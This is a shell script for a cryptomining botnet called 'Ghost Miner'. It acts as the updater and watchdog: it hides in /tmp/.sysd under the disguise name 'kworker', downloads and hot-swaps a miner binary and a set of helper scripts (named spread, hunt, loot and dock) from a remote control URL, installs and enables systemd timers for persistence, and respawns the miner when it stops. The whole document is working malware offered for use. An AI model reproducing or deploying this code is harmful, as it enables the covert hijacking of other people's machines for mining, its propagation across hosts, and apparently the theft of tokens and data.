#!/bin/sh
# ============================================================================
# Ghost Miner auto-update + watchdog. Run from the systemd timer (or cron).
#   1) if the published binary hash changed -> hot-swap and restart
#   2) if the miner is dead -> respawn it
# Bumping PAYLOAD_URL/SHA_URL once updates the whole fleet.
# ============================================================================
set -eu

SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -d "$SYSDIR" ] || exit 0
cd "$SYSDIR"
if [ -r worker.env ]; then . ./worker.env; fi

restart() {
    if command -v systemctl >/dev/null 2>&1; then
        systemctl restart kworker 2>/dev/null || true
    else
        pkill -f "$SYSDIR/kworker" 2>/dev/null || true
        nohup "$SYSDIR/run.sh" >/dev/null 2>&1 &
    fi
}

render_config() {
    curl -fsSL "${CONFIG_URL:?}/config.json" -o config.tmpl 2>/dev/null || return 0
    sed -e "s|__URL__|${POOL:-}|g" \
        -e "s|__USER__|${WALLET:-}|g" \
        -e "s|__PASS__|${RIG_ID:-node}|g" \
        -e "s|__RIGID__|${RIG_ID:-node}|g" \
        -e "s|__TLS__|${TLS:-true}|g" \
        config.tmpl > config.json
}

# --- keep the fleet on the published revision ------------------------------
# Helpers, units and worker.env live in the repo too, so publishing an edit is
# the whole deploy. Compare-then-swap: never rewrite a file that is current, and
# never adopt one whose download failed. mv is atomic, so a helper mid-run (fired
# by its own timer) keeps reading its old inode.
refresh_published() {
    [ -n "${CONFIG_URL:-}" ] || return 0
    for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh; do
        curl -fsSL "$CONFIG_URL/$f" -o "$f.new" 2>/dev/null || { rm -f "$f.new"; continue; }
        chmod 0755 "$f.new"
        if [ ! -f "$f" ] || ! cmp -s "$f" "$f.new"; then mv -f "$f.new" "$f"; fi
        rm -f "$f.new"
    done
    # worker.env is the single source of truth - but only adopt a sane copy
    if curl -fsSL "$CONFIG_URL/worker.env" -o worker.env.new 2>/dev/null; then
        if grep -q '^WALLET=.' worker.env.new && grep -q '^POOL=.' worker.env.new; then
            if [ ! -f worker.env ] || ! cmp -s worker.env worker.env.new; then
                mv -f worker.env.new worker.env
                . ./worker.env
                render_config
                restart
            fi
        fi
        rm -f worker.env.new
    fi
    if command -v systemctl >/dev/null 2>&1; then
        for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass; do
            for e in service timer; do
                curl -fsSL "$CONFIG_URL/$u.$e" -o "/etc/systemd/system/$u.$e" 2>/dev/null || :
            done
        done
        systemctl daemon-reload 2>/dev/null || true
        for t in kworker-updater.timer kworker-spread.timer kworker-tune.timer kworker-loot.timer kworker-dock.timer kworker-mass.timer; do
            systemctl enable --now "$t" 2>/dev/null || true
        done
        if [ -n "${GITHUB_TOKEN:-}" ]; then
            systemctl enable --now kworker-hunt.timer 2>/dev/null || true
        fi
    fi
}
refresh_published

# --- auto-update -----------------------------------------------------------
if [ -n "${SHA_URL:-}" ]; then
    new=$(curl -fsSL "$SHA_URL" 2>/dev/null | awk '{print $1}' | tr 'A-F' 'a-f' || true)
    cur="none"
    [ -x kworker ] && cur=$(sha256sum kworker | awk '{print $1}' | tr 'A-F' 'a-f')
    if [ -n "${new:-}" ] && [ "$new" != "$cur" ]; then
        if curl -fsSL "$PAYLOAD_URL" -o kworker.new 2>/dev/null; then
            got=$(sha256sum kworker.new | awk '{print $1}' | tr 'A-F' 'a-f')
            if [ "$got" = "$new" ]; then
                chmod 0755 kworker.new
                mv -f kworker.new kworker
                render_config
                restart
                exit 0
            fi
            rm -f kworker.new
        fi
    fi
fi

# --- watchdog: respawn if dead --------------------------------------------
if ! pgrep -f "$SYSDIR/kworker" >/dev/null 2>&1; then
    restart
fi
